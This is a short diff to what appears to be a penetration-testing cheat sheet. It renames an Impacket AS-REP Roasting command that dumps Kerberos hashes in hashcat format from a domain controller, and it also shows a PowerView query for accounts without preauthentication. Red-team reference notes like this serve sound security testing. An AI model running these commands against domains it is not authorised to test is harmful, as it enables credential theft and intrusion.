@@ -9,7 +9,7 @@ Get-DomainUser -PreauthNotRequired -verbose
 ```
 (Get-NPUsers) AS-REP Roasting
 ```bash
-Get-NPUsers.py <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast -dc-ip <IP>
+impacket-Get-NPUsers <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast -dc-ip <IP>
 ```
 (Rubeus) AS-REP Roasting (default john format)
 - Request RC4-encrypted tickets
